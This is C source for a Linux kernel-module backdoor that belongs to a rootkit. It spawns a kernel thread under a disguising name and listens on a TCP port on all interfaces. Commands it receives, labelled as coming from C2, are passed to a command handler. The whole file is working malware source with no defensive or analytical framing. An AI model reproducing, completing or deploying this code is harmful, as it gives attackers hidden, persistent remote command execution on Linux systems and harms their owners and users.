#include "rootkit.h"
#include "backdoor.h"
#include "cmd.h"
#include "rootkit.h"

struct kbackdoor_t *bkdoor = NULL;

ssize_t backdoor_recv(struct socket *sock, uint8_t *buf, size_t len)
{
	struct msghdr msg;
	struct kvec iov;
  mm_segment_t oldfs;
	size_t size = 0;

	if (sock->sk == NULL) { return -1; }

  memset(&iov, 0, sizeof(struct iovec));
  memset(&msg, 0, sizeof(struct msghdr));

  // Setup IO vector for sock_recvmsg
	iov.iov_base = buf;
	iov.iov_len = len;

	msg.msg_name = &bkdoor->addr;
	msg.msg_namelen = sizeof(struct sockaddr_in);
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = 0;

  oldfs = get_fs();
  set_fs(KERNEL_DS);
	size = kernel_recvmsg(sock, &msg, &iov, 1, len, msg.msg_flags);
  set_fs(oldfs);
  printk(KERN_INFO "Received %ld: %s\n", size, buf);

	return size;
}

ssize_t backdoor_send(struct socket *sock, uint8_t *buf, size_t len)
{
  struct msghdr msg;
  struct kvec iov;
  
  size_t size = 0;
  if (sock->sk == NULL) { return -1; }

  memset(&iov, 0, sizeof(struct iovec));
  memset(&msg, 0, sizeof(struct msghdr));

  // Setup IO vector for sock_recvmsg
	iov.iov_base = buf;
	iov.iov_len = len;

  size = kernel_sendmsg(sock, &msg, &iov, 1, len);
  return size;
}

int backdoor_run(void *data)
{
  int err;
  uint8_t buffer[BKDOOR_BUF_SIZE];
  size_t size;

  // Set running state
  bkdoor->running = 1;

  // Create TCP socket server
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,2,0)
  err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2,6,5)
  err = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#else
  err = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->sock);
#endif

  if (err < 0) {
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  // Setup sock_addr for socket to listen to
  memset(&bkdoor->addr, 0, sizeof(bkdoor->addr));
  bkdoor->addr.sin_family = AF_INET;
  bkdoor->addr.sin_addr.s_addr = htonl(INADDR_ANY);
  bkdoor->addr.sin_port = htons(BKDOOR_PORT);

  // Bind socket server and check for errors
  err = kernel_bind(bkdoor->sock, (struct sockaddr*)&bkdoor->addr, sizeof(struct sockaddr));
  if (err < 0) {
    // Failed release this socket
    sock_release(bkdoor->sock);
    bkdoor->sock = NULL;
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  // Socket listen
  err = kernel_listen(bkdoor->sock, 0);
  if (err) {
    // Listen unsuccessful
    sock_release(bkdoor->sock);
    bkdoor->sock = NULL;
    bkdoor->thread = NULL;
    bkdoor->running = 0;
    return err;
  }

  debug("Listen successful\n");

  // Create a socket to accept connections
  err = sock_create_lite(PF_INET, SOCK_STREAM, IPPROTO_TCP, &bkdoor->conn);
  // Created with sock_create_lite, set the operations
  bkdoor->conn->ops = bkdoor->sock->ops;

  if (err < 0) {
    // Unable to create accept socket
    sock_release(bkdoor->sock);
    bkdoor->sock = NULL;
    bkdoor->conn = NULL;
    bkdoor->running = 0;
    return err;
  }


  // Main server loop
  for (;;) {
    // Check if exit required
    if (kthread_should_stop()) { do_exit(0); }

    // Clear buffer for writing
    memset(buffer, 0, BKDOOR_BUF_SIZE);

    // Wait for accept
    debug("Waiting for connection\n");
    err = kernel_accept(bkdoor->sock, &bkdoor->conn, 0);
    if (err < 0) {
      debug("Error accepting connection\n");
      // Error accepting connection
      break;
    }

    debug("Received a new connection\n");

    size = backdoor_recv(bkdoor->conn, buffer, sizeof(buffer));
    debug("Received %ld bytes: %s\n", size, buffer);

    // If size < 0, connection probably closed
    if (size < 0) { break; }

    // Process command from C2
    handle_cmd(buffer, size);

    schedule();
  }

  return 0;
}

int backdoor_start(void)
{
  bkdoor = kmalloc(sizeof(struct kbackdoor_t), GFP_KERNEL);
  bkdoor->thread = kthread_run(&backdoor_run, NULL, "sohai check your mods");
  if (bkdoor->thread == NULL) {
    // Can't start thread
    kfree(bkdoor);
    bkdoor = NULL;
    return 1;
  }
  return 0;
}

int backdoor_stop(void)
{
	int err = 0;
	struct pid *pid = find_get_pid(bkdoor->thread->pid);
	struct task_struct *task = pid_task(pid, PIDTYPE_PID);

  // TODO: Implement cleaner exit
	// Kill backdoor
	if (bkdoor->thread != NULL) {
		err = send_sig(SIGKILL, task, 1);
    if (err > 0) {
			while (bkdoor->running == 1)
				msleep(50);
		}
	}

  // Should wait for thread to receive the signals first
  // Close sockets
	if (bkdoor->sock != NULL) {
    kernel_sock_shutdown(bkdoor->sock, SHUT_RDWR);
		sock_release(bkdoor->sock);
		bkdoor->sock = NULL;
	}
  if (bkdoor->conn != NULL) {
    bkdoor->conn = NULL;
  }
  printk(KERN_INFO "Socket shutdown successful\n");
  
  // Free memory
  kfree(bkdoor);
  bkdoor = NULL;

  return err;
}
